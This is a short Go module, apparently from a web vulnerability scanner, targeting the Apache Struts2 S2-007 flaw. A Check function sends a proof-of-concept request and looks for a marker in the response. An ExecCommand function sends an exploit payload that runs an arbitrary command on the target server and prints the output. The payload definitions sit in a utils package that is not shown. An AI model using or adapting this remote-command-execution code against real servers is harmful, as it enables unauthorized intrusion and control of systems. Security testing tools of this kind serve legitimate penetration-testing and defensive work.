package s2_007

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
)

func Check(targeturl string, postData string) {
    respString := utils.PostFunc4Struts2(targeturl, postData, "", utils.POC_s007_check)
    if utils.IfContainsStr(respString, "6308") {
        color.Red("*Found Struts2-007！")
    } else {
        fmt.Println("Struts2-007 Not Vulnerable.")
    }
    
}
func ExecCommand(targeturl string, command string, postData string) {
    respString := utils.PostFunc4Struts2(targeturl, postData, "", utils.POC_s007_exec(command))
    cmdout := utils.GetBetweenStr(respString, "s007execstart", "s007execend")[13:]
    fmt.Println(cmdout)
}
